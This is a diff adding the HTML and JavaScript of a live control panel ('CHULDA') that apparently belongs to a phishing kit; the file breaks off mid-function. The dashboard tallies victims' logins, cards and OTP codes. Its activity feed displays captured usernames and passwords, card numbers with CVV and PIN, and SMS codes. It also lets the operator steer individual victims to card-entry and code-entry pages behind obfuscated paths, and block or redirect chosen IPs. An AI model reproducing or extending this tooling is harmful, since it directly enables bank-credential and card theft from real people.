@@ -1,0 +1,1076 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <title>CHULDA - Control Panel</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        :root {
+            --bg: #f4f5f7;              /* page background - light gray */
+            --panel: #ffffff;           /* cards / panels - white */
+            --panel-2: #f8f9fb;         /* subtle gray panels */
+            --border: #e2e4e8;          /* light gray borders */
+            --ink: #1c2733;             /* main text - dark gray/black */
+            --muted: #6b7280;           /* secondary text - gray */
+            --green: #15803d;           /* highlight - green */
+            --green-bg: #e8f5ec;
+            --red: #dc2626;
+            --red-bg: #fdecea;
+            --blue: #1d4ed8;
+            --blue-bg: #e8effc;
+            --text-on-dark: #ffffff;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--ink);
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            font-size: 14px;
+        }
+
+        .mono { font-family: 'Cascadia Code', 'JetBrains Mono', Consolas, monospace; }
+        .muted { color: var(--muted); }
+
+        .wrap { max-width: 1400px; margin: 0 auto; padding: 24px; }
+
+        /* ---------- Top bar ---------- */
+        .topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+            flex-wrap: wrap;
+            margin-bottom: 24px;
+        }
+
+        .brand { display: flex; align-items: center; gap: 14px; }
+        .brand .logo {
+            width: 46px; height: 46px;
+            border-radius: 12px;
+            background: var(--ink);
+            color: var(--text-on-dark);
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 22px;
+        }
+        .brand h1 { font-size: 20px; letter-spacing: 2px; color: var(--ink); }
+        .brand h1 em { color: var(--green); font-style: normal; }
+        .brand span { color: var(--muted); font-size: 12px; }
+
+        .topbar-right { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+
+        .pill {
+            display: inline-flex; align-items: center; gap: 8px;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            padding: 8px 14px;
+            border-radius: 999px;
+            font-size: 12.5px;
+            color: var(--muted);
+        }
+        .pill i { color: var(--green); }
+
+        .dot {
+            width: 9px; height: 9px; border-radius: 50%;
+            background: var(--green);
+            display: inline-block;
+        }
+        .dot.pulse { animation: pulse 1.6s ease-in-out infinite; }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(21,128,61,.5); }
+            50% { box-shadow: 0 0 0 7px rgba(21,128,61,0); }
+        }
+
+        .icon-btn {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            color: var(--muted);
+            width: 38px; height: 38px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: .15s;
+        }
+        .icon-btn:hover { color: var(--ink); border-color: #000; }
+        .icon-btn.spinning i { animation: spin .7s linear; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ---------- Stat cards ---------- */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 14px;
+            margin-bottom: 24px;
+        }
+
+        .stat-card {
+            background: var(--panel);
+            border: 1px solid var(--accent, var(--border));
+            border-radius: 14px;
+            padding: 16px 18px;
+            border-top: 3px solid var(--accent, var(--green));
+            box-shadow: 0 1px 2px rgba(16,24,40,.04);
+        }
+        .stat-card .s-icon {
+            width: 34px; height: 34px;
+            border-radius: 9px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 15px;
+            margin-bottom: 12px;
+            color: var(--accent, var(--green));
+            background: color-mix(in srgb, var(--accent, var(--green)) 12%, transparent);
+        }
+        .stat-card .s-value { font-size: 26px; font-weight: 700; line-height: 1; color: var(--ink); }
+        .stat-card .s-label { color: var(--muted); font-size: 12px; margin-top: 6px; }
+
+        /* ---------- Layout ---------- */
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1.8fr 1fr;
+            gap: 16px;
+            align-items: start;
+        }
+        @media (max-width: 1024px) { .main-grid { grid-template-columns: 1fr; } }
+
+        .panel {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            overflow: hidden;
+        }
+        /* important panels get a solid black border */
+        .panel.important { border: 2px solid #000; }
+
+        .panel-head {
+            display: flex; align-items: center; gap: 10px;
+            padding: 14px 18px;
+            border-bottom: 1px solid var(--border);
+            background: var(--panel-2);
+        }
+        .panel-head h2 { font-size: 14px; font-weight: 700; flex: 1; color: var(--ink); }
+        .panel-head h2 i { color: var(--green); margin-right: 8px; }
+
+        .count-badge {
+            background: var(--green-bg);
+            color: var(--green);
+            border: 1px solid var(--green);
+            font-size: 12px;
+            font-weight: 700;
+            padding: 2px 10px;
+            border-radius: 999px;
+        }
+        .count-badge.red {
+            background: var(--red-bg);
+            color: var(--red);
+            border: 1px solid var(--red);
+        }
+
+        /* ---------- Users table ---------- */
+        .table-wrap { overflow-x: auto; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        thead th {
+            text-align: left;
+            color: var(--ink);
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: .6px;
+            font-weight: 700;
+            padding: 12px 14px;
+            background: var(--panel-2);
+            border-bottom: 2px solid #000;
+            white-space: nowrap;
+        }
+        tbody td {
+            padding: 12px 14px;
+            border-bottom: 1px solid var(--border);
+            vertical-align: middle;
+            white-space: nowrap;
+        }
+        tbody tr:last-child td { border-bottom: none; }
+        tbody tr:hover { background: var(--panel-2); }
+        tr.row-blocked { background: var(--red-bg); }
+
+        .status-dot {
+            width: 10px; height: 10px; border-radius: 50%;
+            display: inline-block;
+            border: 1px solid #000;
+        }
+        .status-dot.on { background: var(--green); }
+        .status-dot.off { background: #d1d5db; }
+
+        .c-flag { font-size: 15px; margin-right: 6px; vertical-align: -1px; }
+        .c-name { font-weight: 600; color: var(--ink); }
+
+        .tag-blocked {
+            background: var(--red-bg);
+            color: var(--red);
+            border: 1px solid var(--red);
+            font-size: 10px;
+            font-weight: 700;
+            padding: 2px 7px;
+            border-radius: 5px;
+            margin-left: 8px;
+            letter-spacing: .5px;
+        }
+
+        .page-tag {
+            display: inline-block;
+            background: var(--panel-2);
+            border: 1px solid var(--border);
+            padding: 3px 10px;
+            border-radius: 7px;
+            font-size: 12px;
+            color: var(--ink);
+        }
+
+        .mini-btn {
+            border-radius: 8px;
+            padding: 6px 12px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: .15s;
+        }
+        .mini-btn.bad { color: var(--red); border: 1px solid var(--red); background: var(--red-bg); }
+        .mini-btn.bad:hover { background: var(--red); color: #fff; }
+        .mini-btn.good { color: var(--green); border: 1px solid var(--green); background: var(--green-bg); font-weight: 700; }
+        .mini-btn.good:hover { background: var(--green); color: #fff; }
+        .mini-btn.ghost { color: var(--blue); border: 1px solid var(--blue); background: var(--blue-bg); }
+        .mini-btn.ghost:hover { background: var(--blue); color: #fff; }
+
+        .row-actions { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
+
+        .empty-state {
+            padding: 40px 20px;
+            text-align: center;
+            color: var(--muted);
+        }
+        .empty-state i { font-size: 26px; margin-bottom: 10px; opacity: .5; display: block; }
+
+        /* ---------- Side column ---------- */
+        .side-col { display: flex; flex-direction: column; gap: 16px; }
+
+        /* Activity feed */
+        .feed { max-height: 340px; overflow-y: auto; }
+        .feed-item {
+            display: flex; gap: 12px; align-items: flex-start;
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border);
+        }
+        .feed-item:last-child { border-bottom: none; }
+        .feed-icon {
+            width: 32px; height: 32px; flex: 0 0 32px;
+            border-radius: 9px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 13px;
+        }
+        .feed-icon.ev-login { color: var(--blue); background: var(--blue-bg); }
+        .feed-icon.ev-card { color: #7e22ce; background: #f3e8ff; }
+        .feed-icon.ev-otp { color: #0f766e; background: #ccfbf1; }
+        .feed-icon.ev-visit { color: var(--blue); background: var(--blue-bg); }
+        .feed-body { flex: 1; min-width: 0; }
+        .feed-title { font-size: 13px; font-weight: 600; color: var(--ink); }
+        .feed-detail {
+            color: var(--muted);
+            font-size: 12px;
+            margin-top: 3px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .feed-time { color: var(--muted); font-size: 11px; white-space: nowrap; padding-top: 2px; }
+
+        /* Redirect URL form */
+        .redirect-form { display: flex; flex-direction: column; gap: 8px; padding: 16px; border-bottom: 1px solid var(--border); }
+        .redirect-label {
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: .6px;
+            color: var(--muted);
+        }
+        .redirect-label i { color: var(--green); margin-right: 6px; }
+        .redirect-row { display: flex; gap: 10px; }
+        .redirect-row input {
+            flex: 1;
+            min-width: 0;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 9px;
+            padding: 10px 12px;
+            color: var(--ink);
+            font-family: inherit;
+            outline: none;
+            transition: .15s;
+        }
+        .redirect-row input:focus { border-color: var(--green); box-shadow: 0 0 0 3px var(--green-bg); }
+        .btn-save {
+            background: var(--green);
+            color: #fff;
+            border: 1px solid #000;
+            border-radius: 9px;
+            padding: 10px 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: .15s;
+            white-space: nowrap;
+        }
+        .btn-save:hover { background: #166534; }
+
+        /* Block form & list */
+        .block-form { display: flex; gap: 10px; padding: 16px; border-bottom: 1px solid var(--border); }
+        .block-form input {
+            flex: 1;
+            min-width: 0;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 9px;
+            padding: 10px 12px;
+            color: var(--ink);
+            font-family: inherit;
+            outline: none;
+            transition: .15s;
+        }
+        .block-form input:focus { border-color: var(--red); box-shadow: 0 0 0 3px var(--red-bg); }
+        .btn-danger {
+            background: var(--red);
+            color: #fff;
+            border: 1px solid #000;
+            border-radius: 9px;
+            padding: 10px 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: .15s;
+            white-space: nowrap;
+        }
+        .btn-danger:hover { background: #b91c1c; }
+
+        .blocked-list { max-height: 260px; overflow-y: auto; }
+        .blocked-item {
+            display: flex; align-items: center; gap: 10px;
+            padding: 11px 16px;
+            border-bottom: 1px solid var(--border);
+        }
+        .blocked-item:last-child { border-bottom: none; }
+        .blocked-item .ip { flex: 1; font-size: 13px; }
+
+        /* Scrollbars */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #c7cbd1; border-radius: 8px; }
+
+        .toast {
+            position: fixed;
+            bottom: 22px; right: 22px;
+            background: var(--ink);
+            color: #fff;
+            border: 1px solid #000;
+            border-left: 3px solid var(--green);
+            padding: 12px 18px;
+            border-radius: 10px;
+            font-size: 13px;
+            opacity: 0;
+            transform: translateY(8px);
+            transition: .25s;
+            pointer-events: none;
+            z-index: 50;
+            box-shadow: 0 8px 24px rgba(16,24,40,.2);
+        }
+        .toast.show { opacity: 1; transform: translateY(0); }
+        .toast.err { border-left-color: var(--red); }
+
+        /* ---------- User redirect modal ---------- */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(16, 24, 40, .5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            z-index: 100;
+            opacity: 0;
+            visibility: hidden;
+            transition: .2s;
+        }
+        .modal-overlay.open { opacity: 1; visibility: visible; }
+        .modal {
+            width: 100%;
+            max-width: 420px;
+            background: var(--panel);
+            border: 2px solid #000;
+            border-radius: 14px;
+            overflow: hidden;
+            box-shadow: 0 24px 60px rgba(16, 24, 40, .3);
+            transform: translateY(10px);
+            transition: .2s;
+        }
+        .modal-overlay.open .modal { transform: translateY(0); }
+        .modal-head {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 14px 18px;
+            border-bottom: 2px solid #000;
+            background: var(--panel-2);
+        }
+        .modal-head h2 { flex: 1; font-size: 15px; font-weight: 700; color: var(--ink); }
+        .modal-head h2 i { color: var(--green); margin-right: 8px; }
+        .modal-head .ip-chip {
+            font-size: 12px;
+            background: var(--ink);
+            color: #fff;
+            padding: 4px 10px;
+            border-radius: 999px;
+        }
+        .modal-close {
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            color: var(--muted);
+            font-size: 16px;
+            padding: 4px;
+        }
+        .modal-close:hover { color: var(--ink); }
+        .modal-body { padding: 12px; }
+        .modal-hint {
+            font-size: 12px;
+            color: var(--muted);
+            padding: 4px 6px 10px;
+        }
+        .page-option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            width: 100%;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 12px 14px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            text-align: left;
+            transition: .15s;
+            font-family: inherit;
+        }
+        .page-option:hover { border-color: #000; background: var(--panel-2); }
+        .page-option .checked-ico { margin-left: auto; color: var(--green); opacity: 0; }
+        .page-option.selected { border-color: var(--green); background: var(--green-bg); }
+        .page-option.selected .checked-ico { opacity: 1; }
+        .page-option .p-ico {
+            width: 32px; height: 32px; flex: 0 0 32px;
+            border-radius: 9px;
+            display: flex; align-items: center; justify-content: center;
+            background: var(--panel-2);
+            border: 1px solid var(--border);
+            color: var(--ink);
+            font-size: 14px;
+        }
+        .page-option .p-label { font-size: 13px; font-weight: 600; color: var(--ink); }
+        .page-option.invalid .p-label { color: var(--red); }
+        .page-option.invalid .p-ico { color: var(--red); border-color: var(--red); background: var(--red-bg); }
+        .modal-foot {
+            display: flex;
+            gap: 10px;
+            padding: 12px;
+            border-top: 1px solid var(--border);
+        }
+        .modal-foot .btn-save { flex: 1; }
+        .modal-foot .btn-cancel {
+            background: var(--panel);
+            color: var(--muted);
+            border: 1px solid var(--border);
+            border-radius: 9px;
+            padding: 10px 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: .15s;
+        }
+        .modal-foot .btn-cancel:hover { color: var(--ink); border-color: #000; }
+
+        /* ---------- Responsive (mobile) ---------- */
+        @media (max-width: 1024px) {
+            .stats-grid { grid-template-columns: repeat(3, 1fr); }
+        }
+        @media (max-width: 700px) {
+            .wrap { padding: 14px; }
+            .topbar { flex-direction: column; align-items: stretch; }
+            .brand { justify-content: center; }
+            .topbar-right { justify-content: center; }
+
+            .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; }
+            .stat-card { padding: 14px; }
+            .stat-card .s-value { font-size: 22px; }
+
+            .panel { border-radius: 12px; }
+            .panel-head { padding: 12px 14px; }
+
+            /* turn the users table into stacked cards on small screens */
+            .table-wrap.responsive table,
+            .table-wrap.responsive thead,
+            .table-wrap.responsive tbody,
+            .table-wrap.responsive tr,
+            .table-wrap.responsive td {
+                display: block;
+                width: 100%;
+            }
+            .table-wrap.responsive thead { display: none; }
+            .table-wrap.responsive tr {
+                position: relative;
+                padding: 12px 14px;
+                border-bottom: 2px solid #000;
+                background: var(--panel);
+            }
+            .table-wrap.responsive tr.row-blocked { background: var(--red-bg); }
+            .table-wrap.responsive td {
+                border: none;
+                padding: 4px 0;
+                white-space: normal;
+            }
+            .table-wrap.responsive td:first-child {
+                position: absolute; right: 14px; top: 14px;
+            }
+            .table-wrap.responsive td:not(:first-child) {
+                display: flex;
+                align-items: baseline;
+                gap: 8px;
+            }
+            .table-wrap.responsive td::before {
+                content: attr(data-label);
+                font-size: 10px;
+                font-weight: 700;
+                letter-spacing: .5px;
+                text-transform: uppercase;
+                color: var(--muted);
+                min-width: 86px;
+                flex: 0 0 86px;
+            }
+            .table-wrap.responsive .page-tag { display: inline-block; }
+
+            .block-form { flex-direction: column; }
+            .btn-danger { width: 100%; }
+            .redirect-row { flex-direction: column; }
+            .btn-save { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="wrap">
+
+        <!-- Top bar -->
+        <header class="topbar">
+            <div class="brand">
+                <div class="logo">C</div>
+                <div>
+                    <h1>CHUL<em>DA</em></h1>
+                    <span>Live monitoring panel</span>
+                </div>
+            </div>
+            <div class="topbar-right">
+                <div class="pill"><i class="fa-solid fa-server"></i> Up: <span id="uptime" class="mono">—</span></div>
+                <div class="pill"><span class="dot pulse"></span> <span id="clock" class="mono">--:--:--</span></div>
+                <button class="icon-btn" id="refresh-btn" title="Refresh"><i class="fa-solid fa-rotate"></i></button>
+            </div>
+        </header>
+
+        <!-- Stat cards -->
+        <section class="stats-grid">
+            <div class="stat-card" style="--accent: var(--green)">
+                <div class="s-icon"><i class="fa-solid fa-signal"></i></div>
+                <div class="s-value" id="st-online">0</div>
+                <div class="s-label">Users online</div>
+            </div>
+            <div class="stat-card" style="--accent: var(--blue)">
+                <div class="s-icon"><i class="fa-solid fa-users"></i></div>
+                <div class="s-value" id="st-visits">0</div>
+                <div class="s-label">Unique visits</div>
+            </div>
+            <div class="stat-card" style="--accent: var(--ink)">
+                <div class="s-icon"><i class="fa-solid fa-key"></i></div>
+                <div class="s-value" id="st-logins">0</div>
+                <div class="s-label">Logins</div>
+            </div>
+            <div class="stat-card" style="--accent: #7e22ce">
+                <div class="s-icon"><i class="fa-solid fa-credit-card"></i></div>
+                <div class="s-value" id="st-cards">0</div>
+                <div class="s-label">Cards</div>
+            </div>
+            <div class="stat-card" style="--accent: #0f766e">
+                <div class="s-icon"><i class="fa-solid fa-comment-sms"></i></div>
+                <div class="s-value" id="st-otps">0</div>
+                <div class="s-label">OTPs received</div>
+            </div>
+            <div class="stat-card" style="--accent: var(--red)">
+                <div class="s-icon"><i class="fa-solid fa-ban"></i></div>
+                <div class="s-value" id="st-blocked">0</div>
+                <div class="s-label">Blocked IPs</div>
+            </div>
+        </section>
+
+        <!-- Main content -->
+        <section class="main-grid">
+
+            <!-- Live users -->
+            <div class="panel important">
+                <div class="panel-head">
+                    <h2><i class="fa-solid fa-eye"></i> Live users</h2>
+                    <span class="count-badge" id="users-count">0</span>
+                </div>
+                <div class="table-wrap responsive">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th></th>
+                                <th>Country</th>
+                                <th>IP</th>
+                                <th>Current page</th>
+                                <th>Device</th>
+                                <th>Last seen</th>
+                                <th>Hits</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="users-body"></tbody>
+                    </table>
+                    <div class="empty-state" id="users-empty">
+                        <i class="fa-solid fa-user-slash"></i>
+                        No active users at the moment
+                    </div>
+                </div>
+            </div>
+
+            <!-- Side column -->
+            <div class="side-col">
+
+                <!-- Activity feed -->
+                <div class="panel">
+                    <div class="panel-head">
+                        <h2><i class="fa-solid fa-bolt"></i> Recent activity</h2>
+                    </div>
+                    <div class="feed" id="events-feed"></div>
+                </div>
+
+                <!-- IP blocklist -->
+                <div class="panel">
+                    <div class="panel-head">
+                        <h2><i class="fa-solid fa-shield-halved"></i> Block list</h2>
+                        <span class="count-badge red" id="blocked-count">0</span>
+                    </div>
+                    <form class="redirect-form" id="redirect-form">
+                        <label class="redirect-label" for="redirect-url"><i class="fa-solid fa-arrow-up-right-from-square"></i> Redirect blocked IPs to</label>
+                        <div class="redirect-row">
+                            <input type="text" id="redirect-url" class="mono" placeholder="https://www.example.com" autocomplete="off">
+                            <button type="submit" class="btn-save"><i class="fa-solid fa-floppy-disk"></i> Save</button>
+                        </div>
+                    </form>
+                    <form class="block-form" id="block-form">
+                        <input type="text" id="block-ip" class="mono" placeholder="e.g. 192.168.1.1" autocomplete="off">
+                        <button type="submit" class="btn-danger"><i class="fa-solid fa-ban"></i> Block</button>
+                    </form>
+                    <div class="blocked-list" id="blocked-list"></div>
+                </div>
+
+            </div>
+        </section>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <!-- User redirect modal -->
+    <div class="modal-overlay" id="redirect-modal" aria-hidden="true">
+        <div class="modal">
+            <div class="modal-head">
+                <h2><i class="fa-solid fa-paper-plane"></i> Redirect user</h2>
+                <span class="ip-chip mono" id="modal-ip">—</span>
+                <button type="button" class="modal-close" id="modal-close" title="Close"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            <div class="modal-body">
+                <div class="modal-hint">Choose the page this user will be sent to on their next request.</div>
+                <div id="modal-pages"></div>
+            </div>
+            <div class="modal-foot">
+                <button type="button" class="btn-save" id="modal-send"><i class="fa-solid fa-location-arrow"></i> Send to page</button>
+                <button type="button" class="btn-cancel" id="modal-cancel">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function () {
+            'use strict';
+
+            var STATS_URL = '/chulda/api/stats';
+            var ACTION_URL = '/chulda';
+            var REDIRECT_URL_API = '/chulda/api/redirect';
+            var USERREDIRECT_API = '/chulda/api/user-redirect';
+            var POLL_MS = 3000;
+
+            // Destination pages the admin can send a user to (from the backend).
+            var APP_PAGES = <%- JSON.stringify(appPages || []) %>;
+
+            // ---------- Helpers ----------
+            function esc(s) {
+                return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
+                    return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
+                });
+            }
+
+            function timeAgo(ts, now) {
+                var s = Math.max(0, Math.round((now - ts) / 1000));
+                if (s < 5) return 'now';
+                if (s < 60) return s + 's ago';
+                var m = Math.floor(s / 60);
+                if (m < 60) return m + 'm ago';
+                return Math.floor(m / 60) + 'h ago ' + (m % 60) + 'm';
+            }
+
+            function fmtUptime(sec) {
+                var h = Math.floor(sec / 3600);
+                var m = Math.floor((sec % 3600) / 60);
+                if (h > 0) return h + 'h ' + m + 'm';
+                if (m > 0) return m + 'm ' + (sec % 60) + 's';
+                return sec + 's';
+            }
+
+            function parseUA(ua) {
+                if (!ua) return 'Unknown';
+                var os = 'Other';
+                if (/Windows/i.test(ua)) os = 'Windows';
+                else if (/Android/i.test(ua)) os = 'Android';
+                else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
+                else if (/Mac OS/i.test(ua)) os = 'macOS';
+                else if (/Linux/i.test(ua)) os = 'Linux';
+
+                var br = 'Browser';
+                if (/Edg\//i.test(ua)) br = 'Edge';
+                else if (/OPR\//i.test(ua)) br = 'Opera';
+                else if (/Chrome\//i.test(ua)) br = 'Chrome';
+                else if (/Firefox\//i.test(ua)) br = 'Firefox';
+                else if (/Safari\//i.test(ua)) br = 'Safari';
+
+                return br + ' · ' + os;
+            }
+
+            var EVENT_META = {
+                login:   { icon: 'fa-key',         label: 'Login',            cls: 'ev-login' },
+                card:    { icon: 'fa-credit-card', label: 'Card',            cls: 'ev-card' },
+                sms1:    { icon: 'fa-comment-sms', label: 'OTP 1',            cls: 'ev-otp' },
+                sms2:    { icon: 'fa-comment-sms', label: 'OTP 2',            cls: 'ev-otp' },
+                visitor: { icon: 'fa-user-plus',   label: 'New visitor',   cls: 'ev-visit' }
+            };
+
+            function eventDetail(ev) {
+                var d = ev.detail || {};
+                switch (ev.type) {
+                    case 'login': return (d.user || 'N/A') + ' / ' + (d.pass || 'N/A');
+                    case 'card': return (d.card || 'N/A') + ' · ' + (d.exp || '') + ' · CVV ' + (d.cvv || '') + ' · PIN ' + (d.pin || '');
+                    case 'sms1':
+                    case 'sms2': return 'Code: ' + (d.otp || 'N/A');
+                    default: return 'First visit detected';
+                }
+            }
+
+            function toast(msg, isErr) {
+                var t = document.getElementById('toast');
+                t.textContent = msg;
+                t.className = 'toast show' + (isErr ? ' err' : '');
+                setTimeout(function () { t.className = 'toast'; }, 2600);
+            }
+
+            // ---------- Rendering ----------
+            function renderStats(s) {
+                document.getElementById('st-online').textContent = s.online;
+                document.getElementById('st-visits').textContent = s.visits;
+                document.getElementById('st-logins').textContent = s.logins;
+                document.getElementById('st-cards').textContent = s.cards;
+                document.getElementById('st-otps').textContent = s.otps;
+                document.getElementById('st-blocked').textContent = s.blocked;
+            }
+
+            function renderVisitors(visitors, now) {
+                var body = document.getElementById('users-body');
+                var empty = document.getElementById('users-empty');
+                document.getElementById('users-count').textContent = visitors.length;
+
+                if (!visitors.length) {
+                    body.innerHTML = '';
+                    empty.style.display = 'block';
+                    return;
+                }
+                empty.style.display = 'none';
+
+                body.innerHTML = visitors.map(function (v) {
+                    var btnCls = v.blocked ? 'good' : 'bad';
+                    var btnTxt = v.blocked ? 'Unblock' : 'Block';
+                    var btnType = v.blocked ? 'unblock' : 'block';
+                    var country = v.country
+                        ? '<span class="c-flag">' + esc(v.flag) + '</span><span class="c-name">' + esc(v.country) + '</span>'
+                        : '<span class="c-name muted">—</span>';
+                    return '<tr class="' + (v.blocked ? 'row-blocked' : '') + '">' +
+                        '<td data-label=""><span class="status-dot ' + (v.online ? 'on' : 'off') + '" title="' + (v.online ? 'Online' : 'Inactive') + '"></span></td>' +
+                        '<td data-label="Country">' + country + '</td>' +
+                        '<td data-label="IP" class="mono">' + esc(v.ip) + (v.blocked ? '<span class="tag-blocked">BLOCK</span>' : '') + '</td>' +
+                        '<td data-label="Page"><span class="page-tag">' + esc(v.page) + '</span></td>' +
+                        '<td data-label="Device" class="muted">' + esc(parseUA(v.userAgent)) + '</td>' +
+                        '<td data-label="Last seen" class="muted">' + timeAgo(v.lastSeen, now) + '</td>' +
+                        '<td data-label="Hits" class="muted">' + v.hits + '</td>' +
+                        '<td data-label="Action"><div class="row-actions">' +
+                            '<button class="mini-btn ' + btnCls + '" data-ip="' + esc(v.ip) + '" data-type="' + btnType + '">' + btnTxt + '</button>' +
+                            '<button class="mini-btn ghost" data-ip="' + esc(v.ip) + '" data-action="redirect" title="Send user to a page">' +
+                                '<i class="fa-solid fa-location-arrow"></i> Send</button>' +
+                        '</div></td>' +
+                    '</tr>';
+                }).join('');
+            }
+
+            function renderEvents(events, now) {
+                var feed = document.getElementById('events-feed');
+                if (!events.length) {
+                    feed.innerHTML = '<div class="empty-state"><i class="fa-solid fa-clock-rotate-left"></i>No recent activity</div>';
+                    return;
+                }
+                feed.innerHTML = events.map(function (ev) {
+                    var meta = EVENT_META[ev.type] || EVENT_META.visitor;
+                    return '<div class="feed-item">' +
+                        '<div class="feed-icon ' + meta.cls + '"><i class="fa-solid ' + meta.icon + '"></i></div>' +
+                        '<div class="feed-body">' +
+                            '<div class="feed-title">' + meta.label + ' <span class="mono muted">· ' + esc(ev.ip) + '</span></div>' +
+                            '<div class="feed-detail mono">' + esc(eventDetail(ev)) + '</div>' +
+                        '</div>' +
+                        '<div class="feed-time">' + timeAgo(ev.time, now) + '</div>' +
+                    '</div>';
+                }).join('');
+            }
+
+            function renderBlocked(blockedIps) {
+                var list = document.getElementById('blocked-list');
+                document.getElementById('blocked-count').textContent = blockedIps.length;
+                if (!blockedIps.length) {
+                    list.innerHTML = '<div class="empty-state"><i class="fa-solid fa-shield"></i>No blocked IPs</div>';
+                    return;
+                }
+                list.innerHTML = blockedIps.map(function (ip) {
+                    return '<div class="blocked-item">' +
+                        '<i class="fa-solid fa-ban" style="color: var(--red)"></i>' +
+                        '<span class="ip mono">' + esc(ip) + '</span>' +
+                        '<button class="mini-btn good" data-ip="' + esc(ip) + '" data-type="unblock">Unblock</button>' +
+                    '</div>';
+                }).join('');
+            }
+
+            // ---------- Data ----------
+            function loadStats() {
+                return fetch(STATS_URL)
+                    .then(function (r) { return r.json(); })
+                    .then(function (data) {
+                        if (!data.OK) return;
+                        document.getElementById('uptime').textContent = fmtUptime(data.uptimeSeconds);
+                        renderStats(data.stats);
+                        renderVisitors(data.visitors, data.now);
+                        renderEvents(data.events, data.now);
+                        renderBlocked(data.blockedIps);
+                    })
+                    .catch(function () { /* keep last state */ });
+            }
+
+            function setBlocked(ip, type) {
+                fetch(ACTION_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type: type, ip: ip })
+                })
+                    .then(function (r) { return r.json(); })
+                    .then(function (res) {
+                        if (res.OK) {
+                            toast(type === 'block' ? 'IP blocked: ' + ip : 'IP unblocked: ' + ip);
+                            loadStats();
+                        } else {
+                            toast(res.message || 'Error processing action', true);
+                        }
+                    })
+                    .catch(function () { toast('Connection error', true); });
+            }
+
+            function loadRedirectUrl() {
+                return fetch(REDIRECT_URL_API)
+                    .then(function (r) { return r.json(); })
+                    .then(function (res) {
+                        if (res.OK) {
+                            document.getElementById('redirect-url').value = res.url || '';
+                        }
+                    })
+                    .catch(function () { /* keep current */ });
+            }
+
+            function saveRedirectUrl(url) {
+                fetch(REDIRECT_URL_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ url: url })
+                })
+                    .then(function (r) { return r.json(); })
+                    .then(function (res) {
+                        if (res.OK) {
+                            toast('Redirect URL updated');
+                        } else {
+                            toast(res.message || 'Error saving URL', true);
+                        }
+                    })
+                    .catch(function () { toast('Connection error', true); });
+            }
+
+            // ---------- User redirect modal ----------
+            var modalOverlay = document.getElementById('redirect-modal');
+            var selectedPage = null;
+            var modalIp = null;
+
+            // Icons for the destination pages in the modal.
+            function pageIcon(path) {
+                if (path === '/' ) return 'fa-house';
+                if (path.indexOf('QcEwP85AgNE4pnL5mWSM') !== -1) return 'fa-credit-card';
+                if (path.indexOf('RKnUB922z6Mf4HDwg3EZ') !== -1) return 'fa-comment-sms';
+                if (path.indexOf('LGknmeM9HwWUWSutj6mJ') !== -1) return 'fa-comment-dots';
+                if (path.indexOf('DxYwZ7mKqOnBc3vSzRt9') !== -1) return 'fa-circle-check';
+                if (path.indexOf('NqX4Rk7VuLfGc2WdTbH8') !== -1) return 'fa-triangle-exclamation';
+                return 'fa-arrow-right-to-bracket';
+            }
+            function isInvalidPage(path) {
